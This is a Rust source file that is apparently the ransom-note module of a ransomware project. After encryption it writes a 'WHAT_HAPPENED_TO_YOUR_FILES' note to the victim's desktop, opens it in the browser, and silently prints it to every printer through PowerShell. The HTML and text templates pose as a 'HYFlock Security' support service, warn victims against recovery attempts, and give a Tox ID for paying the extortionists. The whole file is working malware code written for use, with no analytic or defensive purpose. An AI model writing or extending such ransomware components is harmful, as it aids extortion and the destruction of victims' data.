use std::fs;
use std::path::{Path, PathBuf};
use std::env;
use std::process::Command;

#[cfg(windows)]
use std::os::windows::fs::OpenOptionsExt;

const TOX_ID: &str = "6898F28E42D768CEC5361B79ABBCBEEC9D1542D529A6749E5D4AEC0C73AA0662220BDC78C315";

pub fn deploy_letter_after_encryption() -> Result<(), String> {
    println!("[LETTER DEPLOYMENT] Starting letter deployment after encryption...");
    
    #[cfg(windows)]
    {
        deploy_windows_letter()?;
    }
    
    #[cfg(not(windows))]
    {
        deploy_cross_platform_letter()?;
    }
    
    #[cfg(windows)]
    {
        print_to_all_printers()?;
    }
    
    println!("[LETTER DEPLOYMENT] Letter deployment completed successfully.");
    Ok(())
}

#[cfg(windows)]
fn deploy_windows_letter() -> Result<(), String> {
    let desktop_path = get_desktop_path();
    let letter_path = PathBuf::from(&desktop_path).join("WHAT_HAPPENED_TO_YOUR_FILES.html");
    
    let html_content = generate_modern_business_html();
    
    println!("[LETTER DEPLOYMENT] Attempting to write HTML letter to: {:?}", letter_path);
    
    let final_path = match fs::write(&letter_path, &html_content) {
        Ok(_) => {
            println!("[LETTER DEPLOYMENT] HTML letter deployed successfully to: {:?}", letter_path);
            letter_path
        }
        Err(e) => {
            eprintln!("[LETTER DEPLOYMENT] Failed to write to {:?}: {}", letter_path, e);
            
            let fallback_path = env::var("USERPROFILE")
                .map(|p| PathBuf::from(p).join("Desktop").join("WHAT_HAPPENED_TO_YOUR_FILES.html"))
                .unwrap_or_else(|_| PathBuf::from("C:\\Users\\Public\\Desktop\\WHAT_HAPPENED_TO_YOUR_FILES.html"));
            
            eprintln!("[LETTER DEPLOYMENT] Trying fallback path: {:?}", fallback_path);
            
            fs::write(&fallback_path, &html_content)
                .map_err(|e| format!("Failed to write HTML letter to fallback path: {}", e))?;
            
            println!("[LETTER DEPLOYMENT] HTML letter deployed to fallback: {:?}", fallback_path);
            fallback_path
        }
    };
    
    println!("[LETTER DEPLOYMENT] Opening HTML file in default browser...");
    Command::new("cmd")
        .args(["/c", "start", "", final_path.to_str().unwrap_or("WHAT_HAPPENED_TO_YOUR_FILES.html")])
        .spawn()
        .map_err(|e| format!("Failed to open HTML file: {}", e))?;
    
    println!("[LETTER DEPLOYMENT] HTML file opened successfully.");
    Ok(())
}

#[cfg(not(windows))]
fn deploy_cross_platform_letter() -> Result<(), String> {
    let home = env::var("HOME").unwrap_or_else(|_| ".".to_string());
    let desktop_path = format!("{}/Desktop", home);
    let letter_path = PathBuf::from(&desktop_path).join("WHAT_HAPPENED_TO_YOUR_FILES.txt");
    
    let text_content = generate_text_letter_with_ascii_art();
    
    fs::write(&letter_path, text_content)
        .map_err(|e| format!("Failed to write text letter: {}", e))?;
    
    println!("[LETTER DEPLOYMENT] Text letter deployed to: {:?}", letter_path);
    
    Ok(())
}

#[cfg(windows)]
fn get_desktop_path() -> String {
    use windows::Win32::UI::Shell::SHGetFolderPathW;
    
    let mut path = [0u16; 260];
    unsafe {
        let result = SHGetFolderPathW(None, 0x0000, None, 0, &mut path);
        if result.is_ok() {
            let len = path.iter().position(|&c| c == 0).unwrap_or(path.len());
            String::from_utf16_lossy(&path[..len])
        } else {
            let user_profile = env::var("USERPROFILE").unwrap_or_default();
            format!("{}\\Desktop", user_profile)
        }
    }
}

fn generate_modern_business_html() -> String {
    let target_identifier = crate::crypt::config::Config::load_from_binary()
        .map(|c| c.target_identifier)
        .unwrap_or_default();
    
    let identifier_section = if target_identifier.is_empty() {
        String::new()
    } else {
        format!(r#"
        <div class="identifier-section">
            <div class="identifier-title">Your Login Identifier</div>
            <div class="identifier-box">{}</div>
        </div>
        "#, target_identifier)
    };
    
    format!(r#"<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>HYFlock Security - Data Protection Notice</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap');
        
        * {{
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }}
        
        body {{
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #0a0e27 0%, #1a1f3a 50%, #0d1229 100%);
            min-height: 100vh;
            line-height: 1.7;
            color: #e8eaf0;
            position: relative;
            overflow-x: hidden;
        }}
        
        body::before {{
            content: '';
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: 
                radial-gradient(circle at 20% 30%, rgba(99, 102, 241, 0.08) 0%, transparent 50%),
                radial-gradient(circle at 80% 70%, rgba(139, 92, 246, 0.08) 0%, transparent 50%);
            pointer-events: none;
            z-index: 0;
        }}
        
        .container {{
            max-width: 900px;
            margin: 0 auto;
            padding: 60px 40px;
            position: relative;
            z-index: 1;
        }}
        
        .header {{
            text-align: center;
            margin-bottom: 60px;
            padding-bottom: 40px;
            border-bottom: 1px solid rgba(99, 102, 241, 0.2);
        }}
        
        .logo {{
            font-family: 'JetBrains Mono', monospace;
            font-size: 72px;
            font-weight: 900;
            background: linear-gradient(
                90deg,
                #ff0055 0%,
                #ff6600 14%,
                #ffcc00 28%,
                #00ff66 42%,
                #00ccff 56%,
                #9900ff 70%,
                #ff0099 84%,
                #ff0055 100%
            );
            background-size: 200% 200%;
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            letter-spacing: 12px;
            margin-bottom: 16px;
            text-transform: uppercase;
            position: relative;
            display: inline-block;
            animation: rainbow-flow 6s linear infinite;
            text-shadow:
                0 1px 0 rgba(0, 0, 0, 0.8),
                0 2px 0 rgba(0, 0, 0, 0.6),
                0 3px 0 rgba(0, 0, 0, 0.4),
                0 4px 0 rgba(0, 0, 0, 0.2),
                0 5px 0 rgba(0, 0, 0, 0.1),
                0 6px 6px rgba(0, 0, 0, 0.3),
                0 7px 12px rgba(0, 0, 0, 0.2);
            filter: drop-shadow(0 0 20px rgba(255, 0, 85, 0.4))
                    drop-shadow(0 0 40px rgba(255, 102, 0, 0.3))
                    drop-shadow(0 0 60px rgba(255, 204, 0, 0.2));
        }}
        
        .logo::before {{
            content: 'HYFlock';
            position: absolute;
            top: 2px;
            left: 2px;
            z-index: -1;
            background: linear-gradient(135deg, rgba(255, 255, 255, 0.2) 0%, rgba(255, 255, 255, 0.1) 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            text-shadow: none;
        }}
        
        .logo::after {{
            content: '';
            position: absolute;
            bottom: -8px;
            left: 50%;
            transform: translateX(-50%);
            width: 100%;
            height: 8px;
            background: linear-gradient(90deg,
                transparent 0%,
                rgba(255, 0, 85, 0.5) 14%,
                rgba(255, 102, 0, 0.5) 28%,
                rgba(255, 204, 0, 0.5) 42%,
                rgba(0, 255, 102, 0.5) 56%,
                rgba(0, 204, 255, 0.5) 70%,
                rgba(153, 0, 255, 0.5) 84%,
                rgba(255, 0, 153, 0.5) 100%
            );
            border-radius: 4px;
            filter: blur(4px);
        }}
        
        @keyframes rainbow-flow {{
            0% {{ background-position: 0% 50%; }}
            50% {{ background-position: 100% 50%; }}
            100% {{ background-position: 0% 50%; }}
        }}
        
        .subtitle {{
            font-size: 14px;
            color: #a5b4fc;
            letter-spacing: 6px;
            text-transform: uppercase;
            font-weight: 500;
        }}
        
        .content {{
            background: rgba(15, 23, 42, 0.6);
            backdrop-filter: blur(20px);
            border: 1px solid rgba(99, 102, 241, 0.15);
            border-radius: 12px;
            padding: 40px;
            margin-bottom: 40px;
            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
        }}
        
        .alert-box {{
            background: linear-gradient(135deg, rgba(239, 68, 68, 0.1) 0%, rgba(220, 38, 38, 0.05) 100%);
            border-left: 4px solid #ef4444;
            padding: 24px;
            margin: 30px 0;
            border-radius: 0 8px 8px 0;
        }}
        
        .alert-title {{
            color: #fca5a5;
            font-size: 18px;
            font-weight: 600;
            margin-bottom: 12px;
            display: flex;
            align-items: center;
            gap: 10px;
        }}
        
        .alert-title::before {{
            content: '⚠';
            font-size: 20px;
        }}
        
        .alert-text {{
            color: #fecaca;
            font-size: 15px;
            line-height: 1.8;
        }}
        
        h2 {{
            color: #c7d2fe;
            font-size: 22px;
            font-weight: 600;
            margin: 40px 0 20px 0;
            padding-bottom: 12px;
            border-bottom: 1px solid rgba(99, 102, 241, 0.2);
        }}
        
        h3 {{
            color: #a5b4fc;
            font-size: 18px;
            font-weight: 600;
            margin: 30px 0 16px 0;
        }}
        
        p {{
            color: #d1d5db;
            font-size: 15px;
            margin-bottom: 16px;
            line-height: 1.8;
        }}
        
        ul {{
            list-style: none;
            padding: 0;
            margin: 20px 0;
        }}
        
        li {{
            color: #d1d5db;
            font-size: 15px;
            padding: 12px 0 12px 32px;
            position: relative;
            line-height: 1.7;
        }}
        
        li::before {{
            content: '→';
            position: absolute;
            left: 0;
            color: #818cf8;
            font-weight: 600;
        }}
        
        strong {{
            color: #c7d2fe;
            font-weight: 600;
        }}
        
        .contact-section {{
            background: linear-gradient(135deg, rgba(99, 102, 241, 0.1) 0%, rgba(139, 92, 246, 0.05) 100%);
            border: 1px solid rgba(99, 102, 241, 0.2);
            border-radius: 12px;
            padding: 40px;
            text-align: center;
            margin-top: 40px;
        }}
        
        .contact-title {{
            color: #a5b4fc;
            font-size: 20px;
            font-weight: 600;
            margin-bottom: 24px;
            text-transform: uppercase;
            letter-spacing: 2px;
        }}
        
        .tox-id-box {{
            background: rgba(15, 23, 42, 0.8);
            border: 2px solid rgba(99, 102, 241, 0.3);
            border-radius: 8px;
            padding: 20px 24px;
            margin: 24px auto;
            max-width: 700px;
            word-break: break-all;
            font-family: 'JetBrains Mono', monospace;
            font-size: 13px;
            color: #818cf8;
            letter-spacing: 1px;
            line-height: 1.6;
        }}
        
        .tox-label {{
            display: inline-block;
            background: rgba(99, 102, 241, 0.2);
            color: #a5b4fc;
            padding: 4px 12px;
            border-radius: 4px;
            font-size: 11px;
            font-weight: 600;
            text-transform: uppercase;
            letter-spacing: 1px;
            margin-bottom: 12px;
        }}
        
        .footer {{
            text-align: center;
            margin-top: 50px;
            padding-top: 30px;
            border-top: 1px solid rgba(99, 102, 241, 0.15);
            color: #6b7280;
            font-size: 12px;
            font-weight: 500;
            letter-spacing: 1px;
        }}
        
        .identifier-section {{
            background: linear-gradient(135deg, rgba(34, 197, 94, 0.1) 0%, rgba(16, 185, 129, 0.05) 100%);
            border: 1px solid rgba(34, 197, 94, 0.2);
            border-radius: 12px;
            padding: 30px;
            text-align: center;
            margin-top: 40px;
        }}
        
        .identifier-title {{
            color: #86efac;
            font-size: 16px;
            font-weight: 600;
            margin-bottom: 16px;
            text-transform: uppercase;
            letter-spacing: 2px;
        }}
        
        .identifier-box {{
            background: rgba(15, 23, 42, 0.8);
            border: 2px solid rgba(34, 197, 94, 0.3);
            border-radius: 8px;
            padding: 16px 20px;
            word-break: break-all;
            font-family: 'JetBrains Mono', monospace;
            font-size: 14px;
            color: #86efac;
            letter-spacing: 1px;
            line-height: 1.6;
        }}
        
        .highlight {{
            color: #fbbf24;
            font-weight: 600;
        }}
        
        @media (max-width: 768px) {{
            .container {{
                padding: 30px 20px;
            }}
            
            .logo {{
                font-size: 36px;
                letter-spacing: 4px;
            }}
            
            .content {{
                padding: 24px;
            }}
            
            .tox-id-box {{
                font-size: 11px;
                padding: 16px;
            }}
        }}
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="logo">HYFlock</div>
            <div class="subtitle">Enterprise Security Solutions</div>
        </div>
        
        <div class="content">
            <div class="alert-box">
                <div class="alert-title">Important Security Notice</div>
                <div class="alert-text">
                    We strongly advise against modifying, deleting, or relocating any encrypted files. 
                    Such actions may result in <strong>irreversible data loss</strong> that cannot be recovered by any means.
                </div>
            </div>
            
            <h2>Data Protection Information</h2>
            <p>
                Certain data on your system has been secured using our advanced encryption protocols. 
                To ensure the confidentiality and integrity of this information, we recommend contacting 
                our professional support service. This approach guarantees that your data remains 
                protected from unauthorized access while maintaining the possibility of secure recovery.
            </p>
            
            <h2>Security Technology Overview</h2>
            <p>
                HYFlock employs <strong>military-grade HC-128 encryption technology</strong>, which has been 
                independently verified by cybersecurity experts worldwide. Our sophisticated encryption 
                methodology ensures that your information remains completely secure and inaccessible to 
                unauthorized parties.
            </p>
            
            <h3>Key Security Features:</h3>
            <ul>
                <li><strong>Exclusive Decryption Authority:</strong> Your files are protected by unique 
                encryption keys, accessible only through our secure systems. Alternative recovery methods 
                may compromise data integrity.</li>
                
                <li><strong>Optimized Encryption Process:</strong> Our advanced encryption architecture 
                operates with exceptional efficiency while maintaining the highest security standards 
                through state-of-the-art cryptographic algorithms.</li>
                
                <li><strong>Global Reliability:</strong> Trusted by organizations in more than 50 countries 
                with exceptional service availability and prompt decryption services following proper 
                verification procedures.</li>
            </ul>
            
            <div class="alert-box">
                <div class="alert-title">Data Recovery Information</div>
                <div class="alert-text">
                    Your data is currently protected by our proprietary encryption technology. 
                    Decryption keys are stored in our secure infrastructure and cannot be replicated 
                    or bypassed. We strongly recommend using our specialized decryption service to ensure 
                    <strong>complete data recovery</strong>.
                </div>
            </div>
            
            <p>
                We understand that this situation requires your attention. <span class="highlight">Your data 
                remains fully recoverable</span> through our established secure channel. Our team is 
                uniquely positioned to facilitate access recovery with our specialized decryption expertise.
            </p>
        </div>
        
        {}
        
        <div class="contact-section">
            <div class="contact-title">Contact Professional Support</div>
            <p style="margin-bottom: 20px;">For assistance with data recovery, please contact our dedicated support service:</p>
            <div class="tox-label">TOX ID</div>
            <div class="tox-id-box">{}</div>
            <p style="color: #9ca3af; font-size: 14px; margin-top: 20px;">
                Response time: Typically within 2 hours<br>
                All communications are protected with end-to-end encryption
            </p>
        </div>
        
        <div class="footer">
            HYFlock Security | Official Notice | Confidential Communication
        </div>
    </div>
</body>
</html>"#, identifier_section, TOX_ID)
}

fn generate_text_letter_with_ascii_art() -> String {
    format!(r#"
╔══════════════════════════════════════════════════════════════════════════════╗
║                                                                              ║
║  ██╗   ██╗██╗███████╗██╗  ██╗██╗   ██╗███████╗                              ║
║  ██║   ██║██║██╔════╝██║ ██╔╝██║   ██║██╔════╝                              ║
║  ██║   ██║██║███████╗█████╔╝ ██║   ██║███████╗                              ║
║  ╚██╗ ██╔╝██║╚════██║██╔═██╗ ██║   ██║╚════██║                              ║
║   ╚████╔╝ ██║███████║██║  ██╗╚██████╔╝███████║                              ║
║    ╚═══╝  ╚═╝╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝                              ║
║                                                                              ║
║                    ENTERPRISE SECURITY SOLUTIONS                              ║
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝

═══════════════════════════════════════════════════════════════════════════════
  IMPORTANT SECURITY NOTICE
═══════════════════════════════════════════════════════════════════════════════

  We strongly advise against modifying, deleting, or relocating any encrypted 
  files. Such actions may result in IRREVERSIBLE DATA LOSS that cannot be 
  recovered by any means.

═══════════════════════════════════════════════════════════════════════════════
  DATA PROTECTION INFORMATION
═══════════════════════════════════════════════════════════════════════════════

  Certain data on your system has been secured using our advanced encryption 
  protocols. To ensure the confidentiality and integrity of this information, 
  we recommend contacting our professional support service. This approach 
  guarantees that your data remains protected from unauthorized access while 
  maintaining the possibility of secure recovery.

═══════════════════════════════════════════════════════════════════════════════
  SECURITY TECHNOLOGY OVERVIEW
═══════════════════════════════════════════════════════════════════════════════

  HYFlock employs military-grade HC-128 encryption technology, which has been 
  independently verified by cybersecurity experts worldwide. Our sophisticated 
  encryption methodology ensures that your information remains completely secure 
  and inaccessible to unauthorized parties.

  Key Security Features:

  → Exclusive Decryption Authority:
    Your files are protected by unique encryption keys, accessible only through 
    our secure systems. Alternative recovery methods may compromise data integrity.

  → Optimized Encryption Process:
    Our advanced encryption architecture operates with exceptional efficiency 
    while maintaining the highest security standards through state-of-the-art 
    cryptographic algorithms.

  → Global Reliability:
    Trusted by organizations in more than 50 countries with exceptional service 
    availability and prompt decryption services following proper verification 
    procedures.

═══════════════════════════════════════════════════════════════════════════════
  DATA RECOVERY INFORMATION
═══════════════════════════════════════════════════════════════════════════════

  Your data is currently protected by our proprietary encryption technology. 
  Decryption keys are stored in our secure infrastructure and cannot be 
  replicated or bypassed. We strongly recommend using our specialized decryption 
  service to ensure COMPLETE DATA RECOVERY.

  Your data remains fully recoverable through our established secure channel. 
  Our team is uniquely positioned to facilitate access recovery with our 
  specialized decryption expertise.

═══════════════════════════════════════════════════════════════════════════════
  CONTACT PROFESSIONAL SUPPORT
═══════════════════════════════════════════════════════════════════════════════

  For assistance with data recovery, please contact our dedicated support service:

  ┌──────────────────────────────────────────────────────────────────────────┐
  │                                                                          │
  │  TOX ID:                                                                 │
  │                                                                          │
  │  {}                                                                     │
  │                                                                          │
  └──────────────────────────────────────────────────────────────────────────┘

  Response time: Typically within 2 hours
  All communications are protected with end-to-end encryption

═══════════════════════════════════════════════════════════════════════════════
  HYFlock Security | Official Notice | Confidential Communication
═══════════════════════════════════════════════════════════════════════════════
"#, TOX_ID)
}

#[cfg(windows)]
fn print_to_all_printers() -> Result<(), String> {
    use std::process::Command;
    
    println!("[LETTER DEPLOYMENT] Attempting to print to all available printers...");
    
    let desktop_path = get_desktop_path();
    let letter_path = PathBuf::from(&desktop_path).join("WHAT_HAPPENED_TO_YOUR_FILES.html");
    
    if !letter_path.exists() {
        return Err("Letter file not found".to_string());
    }
    
    let letter_path_str = letter_path.to_string_lossy().to_string();
    
    let output = Command::new("powershell")
        .args(&[
            "-Command",
            &format!(
                "Get-Printer | Where-Object {{ $_.PrinterStatus -eq 'Normal' }} | ForEach-Object {{ Start-Process -FilePath '{}' -Verb Print -WindowStyle Hidden }}",
                letter_path_str
            )
        ])
        .output();
    
    match output {
        Ok(result) => {
            if result.status.success() {
                println!("[LETTER DEPLOYMENT] Successfully sent print jobs to all available printers");
                Ok(())
            } else {
                let error = String::from_utf8_lossy(&result.stderr);
                eprintln!("[LETTER DEPLOYMENT] Print command failed: {}", error);
                Err(format!("Print command failed: {}", error))
            }
        }
        Err(e) => {
            eprintln!("[LETTER DEPLOYMENT] Failed to execute print command: {}", e);
            Err(format!("Failed to execute print command: {}", e))
        }
    }
}
